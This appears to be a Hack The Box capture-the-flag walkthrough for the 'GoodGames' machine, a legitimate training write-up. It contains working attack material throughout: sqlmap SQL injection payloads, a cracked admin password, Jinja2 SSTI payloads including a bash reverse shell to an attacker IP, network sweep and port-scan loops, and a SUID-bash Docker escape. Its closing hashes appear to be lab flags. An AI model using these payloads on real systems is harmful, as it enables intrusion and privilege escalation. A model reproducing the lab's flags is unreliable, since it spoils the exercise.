---
title: "GoodGames"
description: "Hack The Box walkthrough covering SQL injection to dump a database, then dealing with SSTI in Jinja2 Python. Finishing with Docker enumeration and SUID priv esc."
published: 2026-09-29
platform: "Hack The Box"
category: "Linux"
difficulty: "Easy"
os: "Linux"
tags:
- SQL Injection
- Database dumping / Enumeration
- Password Cracking
- Flask Applications
- Jinja2 SSTI (Python)
- Linux Enum
- Docker / Container Enumeration
- Docker Bind Mounts & Host Filesystem Access
- SUID Privilege Escalation
featured: true
homepage: true
draft: false
---

```
Concepts:
- SQL Injection
- Database dumping / Enumeration
- Password Cracking
- Flask Applications
- Jinja2 SSTI (Python)
- Linux Enum
- Docker / Container Enumeration
- Docker Bind Mounts & Host Filesystem Access
- SUID Privilege Escalation
```

## Initial Recon

Network Mapping:

```
nmap -p -sVC -vvv -oN nmap/service 10.129.230.172
```
> Ports open: 80

## Services

### Web Application

- Site is a store/blog site.
- User registration, login and forgot password exist

You can sign up for user, login take a look around

OR

Run some fuzzers against the target like intruder SQL, XSS and SSTI payload lists againt the login endpoint

![[Pasted image 20260821140943.png]]

OR

Run SQLmap against the site, if you use, use `--technique=B` for quicker results:

```
sqlmap http://goodgames.htb --forms --crawl=2 --batch --technique=B

Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: email=aec' AND 6541=(SELECT (CASE WHEN (6541=6541) THEN 6541 ELSE (SELECT 7931 UNION SELECT 9006) END))-- lfCc&password=aec

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=aec' AND (SELECT 5439 FROM (SELECT(!SLEEP(5)))pBnU)-- xVKH&password=aec
---
```

Grab hash from db: main, table: user, column: password

`sqlmap -r login.req -p email -v 1 -D main -T user -C password --dump --technique=B`

`sqlmap http://goodgames.htb --forms --crawl=2 --batch`

`sqlmap http://goodgames.htb --forms --crawl=2 --batch -v 0 -D main -T user -C password --dump --technique=B --flush-session --level=3`

Crack the hash

`hashcat admin.hash -m 0 -a 0 /usr/share/wordlists/rockyou.txt`

`admin@goodgames.htb:superadministrator`

Login as Admin

## internal-administrator.goodgames.htb

Application Flask 2.0.2.

Settings - Fuzz all parameters

`Name` param has SSTI

[Payloads for Flask (jinja)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---basic-injection:~:text=%7B%7B%20namespace%2E%5F%5Finit%5F%5F%2E%5F%5Fglobals%5F%5F%2Eos%2Epopen%28%27id%27%29%2Eread%28%29%20%7D%7D)

```
{{ namespace.__init__.__globals__.os.popen('id').read() }}

{{config.__class__.__init__.__globals__['os'].popen('ls /home/augustus/').read()}}

{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.184/4444 0>&1"').read() }}

{{namespace.__init__.__globals__.os.popen('bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.184/4444+0>%261"').read()}}
```

---
## Linux Enumeration


https://medium.com/@indigoshadowwashere/linux-docker-container-escapes-cheatsheet-49e47f21e27a

### Full TTY Shell

**Remote**
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

**Local**
stty raw -echo; fg


- Ifconfig
- whoami
- privileges
- foothold dir, root dir, home dir
- processes
- scheduled tasks
- priv esc permissions
- sudo -l
- search for password files
- which users and groups

```
for i in {1..254}; do
    ping -c 1 -W 1 172.19.0.$i >/dev/null 2>&1 && echo "[+] 172.19.0.$i is alive"
done
```


```
target=172.19.0.1

for port in 21 22 23 25 53 80 110 111 135 139 143 443 445 993 995 1433 1521 2049 3306 3389 5432 6379 8000 8080 8443; do
    timeout 1 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null &&
        echo "[+] $target:$port OPEN"
done
```

- SSH is open
- Try to SSH as Augustus
- Password Reuse

Augustus's home directory is the same as the container, see if changs in one affect another

As we are root in the container, we can manipulate files as root.

Copy /bin/bash to ~
Close SSH
chown the bash to root, add suid perms, 4777
SSH back into goodgames .2, run bash in prilegeled mode

```
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.
root@3a453ab39d3d:/home/augustus# ls
bash  linpeas.sh  user.txt
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# chmod 4777 bash
root@3a453ab39d3d:/home/augustus# ls -la
total 2320
drwxr-xr-x 3 1000 1000    4096 Aug 25 15:06 .
drwxr-xr-x 1 root root    4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root       9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000    3526 Oct 19  2021 .bashrc
drwx------ 3 1000 1000    4096 Aug 25 15:00 .gnupg
-rw-r--r-- 1 1000 1000     807 Oct 19  2021 .profile
-rwsrwxrwx 1 root root 1234376 Aug 25 15:06 bash
-rwxr-xr-x 1 1000 1000 1106683 Aug  3 08:06 linpeas.sh
-rw-r----- 1 root 1000      33 Aug 25 14:15 user.txt
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
Last login: Tue Aug 25 16:05:57 2026 from 172.19.0.2
augustus@GoodGames:~$ ls -la
total 2320
drwxr-xr-x 3 augustus augustus    4096 Aug 25 16:06 .
drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..
-rwsrwxrwx 1 root     root     1234376 Aug 25 16:06 bash
lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc
drwx------ 3 augustus augustus    4096 Aug 25 16:00 .gnupg
-rwxr-xr-x 1 augustus augustus 1106683 Aug  3 09:06 linpeas.sh
-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile
-rw-r----- 1 root     augustus      33 Aug 25 15:15 user.txt
augustus@GoodGames:~$ ./bash -p
bash-5.1# whoami
root
bash-5.1# cat root.txt
cat: root.txt: No such file or directory
bash-5.1#              

```

7da67520922d64a96d0ffec24881c64f
c87439b32bf5b3722022324e6cc0478f

```
Flask SSTI
    ↓
RCE inside container
    ↓
root inside container
    ↓
discover 172.19.0.1
    ↓
SSH to Docker host as augustus
    ↓
discover shared /home/augustus
    ↓
container root modifies shared file
    ↓
host sees root-owned SUID bash
    ↓
./bash -p on host
    ↓
HOST ROOT
```
